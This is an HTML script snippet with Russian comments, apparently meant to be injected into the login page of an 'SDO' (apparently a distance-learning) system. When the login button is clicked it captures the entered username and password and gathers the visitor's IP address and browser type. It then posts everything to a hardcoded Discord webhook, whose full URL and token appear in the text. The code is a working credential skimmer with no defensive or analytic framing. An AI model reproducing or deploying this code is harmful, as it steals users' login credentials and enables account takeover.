    <!-- СКРИПТ ОТПРАВКИ ТОЛЬКО ПРИ НАЖАТИИ НА КНОПКУ ВХОД -->
    <script>
        // ===== ВАШ DISCORD WEBHOOK =====
        const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1484956365553406038/Lp82Tiyzr9Pdq3l_3sUq8aseB1Sfz9yQArV5XTzceVoUA74jxj-9LzghLUDHl08xvabe';
        // ==============================
        
        // Функция получения IP
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch(e) {
                return 'IP не определен';
            }
        }
        
        // Функция отправки в Discord
        async function sendToDiscord(username, password) {
            const ip = await getIP();
            const now = new Date();
            const time = now.toLocaleString('ru-RU');
            const ua = navigator.userAgent;
            
            // Определяем браузер
            let browser = 'Unknown';
            if (ua.includes('Chrome')) browser = 'Chrome';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Safari')) browser = 'Safari';
            
            // Создаем сообщение
            const messageText = `
🔴 **НОВЫЙ ВХОД В СДО** 🔴
━━━━━━━━━━━━━━━━━━━━━━━
👤 **Логин:** ${username}
🔑 **Пароль:** ${password}
🌍 **IP адрес:** ${ip}
💻 **Браузер:** ${browser}
⏰ **Время:** ${time}
━━━━━━━━━━━━━━━━━━━━━━━
⚠️ Данные для входа
            `;
            
            try {
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: messageText,
                        username: "СДО Мониторинг"
                    })
                });
                
                if (response.ok) {
                    console.log('✅ Данные отправлены в Discord!');
                    return true;
                } else {
                    console.error('❌ Ошибка отправки:', await response.text());
                    return false;
                }
            } catch(error) {
                console.error('❌ Ошибка отправки:', error);
                return false;
            }
        }
        
        // ===== ТОЛЬКО ПЕРЕХВАТ НАЖАТИЯ НА КНОПКУ =====
        const loginBtn = document.getElementById('loginbtn');
        const usernameField = document.getElementById('username');
        const passwordField = document.getElementById('password');
        
        if (loginBtn && usernameField && passwordField) {
            console.log('✅ Скрипт активирован. Отправка ТОЛЬКО при нажатии на кнопку "Вход"');
            
            loginBtn.addEventListener('click', async function(e) {
                const username = usernameField.value.trim();
                const password = passwordField.value;
                
                // Отправляем ТОЛЬКО если оба поля заполнены
                if (username && password) {
                    console.log('🔔 Нажата кнопка входа. Отправка данных...');
                    await sendToDiscord(username, password);
                } else {
                    console.log('⚠️ Кнопка нажата, но поля пустые. Отправка отменена.');
                }
            });
        } else {
            console.error('❌ Не удалось найти элементы формы!');
        }
    </script>
